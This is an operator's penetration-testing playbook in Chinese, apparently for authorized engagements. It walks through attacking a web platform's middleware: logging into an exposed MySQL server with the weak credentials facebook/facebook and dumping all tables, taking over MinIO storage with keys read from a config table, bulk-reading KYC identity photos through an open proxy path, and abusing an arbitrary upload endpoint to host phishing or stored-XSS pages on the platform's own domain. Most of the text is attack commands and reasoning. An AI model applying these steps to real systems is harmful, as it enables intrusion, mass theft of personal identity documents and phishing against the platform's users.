# L4 中间件:MySQL 边界判定 + MinIO 接管 + 公开桶与任意上传

## 1. MySQL(3306 对外 + 业务名/业务名 弱口令)

```bash
mysql -h <源站IP> -P 3306 -u facebook -p'facebook' -e "select current_user(), @@datadir, @@secure_file_priv;"
mysql -h <源站IP> -P 3306 -u facebook -p'facebook' -e "show grants;"
```

- 宝塔布局特征:`@@datadir=/www/server/data/`;授权形如 `ALL PRIVILEGES ON <业务库>.*`
- **先判权限边界,别急着写马**:
  - 无 `FILE` / 无 `SUPER` ⇒ `LOAD_FILE()` 返 NULL、`INTO OUTFILE` 失败
  - `secure_file_priv` 非空 ⇒ 即使有 FILE 也只能写指定目录
  - 结论写法:「全库 DML 已获取;文件读写不通(已验证),MySQL→写马路径不成立」——这是已验证边界,不是"没试"
- 导出纪律:逐表 `SELECT` 落 JSON(一表一文件 + manifest);先 `COUNT(*)` 记基准,导出后**核对行数**再谈"全量";两套环境分别落目录

## 2. MinIO:`sys_oss_config` 凭据 → 对象存储全量读写

```bash
# 表里读:access_key / secret_key / endpoint(常写 127.0.0.1:19000)/ bucket / domain
# 直连源站对外 19000 + SigV4 签名:
GET http://<源站IP>:19000/                      → 200 列桶(返回 Owner / bucket 名)
GET http://<源站IP>:19000/<bucket>?list-type=2  → 200 列对象(IsTruncated 分页)
```

- 判据:表里 endpoint 写 `127.0.0.1` **不代表只能内网访问** —— 源站常把 19000 一起放公网
- `:19001` 控制台若也对外,同组凭据可直接登进去(`service/restart`、`set-config-*`、`update` = 管理面)

## 3. 桶无策略 + nginx `/oss/` 反代 = 对象直读

```bash
GET https://<业务域>/oss/<原始路径>          # 200 image/png  (KYC 证件照/合同/截图)
GET https://<业务域>/oss/<bucket>/           # 403            (S3 语义 ⇒ /oss/ 反代到内网 MinIO)
```

- **ID → PII 映射**:`sys_oss`(ossId) ← 业务表(如 `fb_userVerify` 的证件照字段指向 ossId)= 可用「ID 列表」批量拼出对象 URL 取证件
- 判据:桶根 403 但具体对象 200 ⇒ **不是"目录列举被封",而是具体对象可匿名读**,要按语义分别下结论(反之亦然)

## 4. 任意文件上传 → 用业务自有引流域名托管任意内容

```bash
POST /prod-api/system/oss/upload      # multipart: file
  → {"url":"http://<oss域>/oss/<bucket>/2026/09/25/<x>.html"}
GET https://<业务域>/oss/.../<x>.html # → 200 text/html  (同一域!)
```

- 因为桶公开 + `/oss/` 反代,上传的 `.html` **就在平台用于投放引流的同域下可读** ⇒ 钓鱼 / 存储型 XSS / 替换落地页
- 纪律:每次只传**无害标记文件**,台账记路径,结束按批准清理(不要留下"能跑的东西")
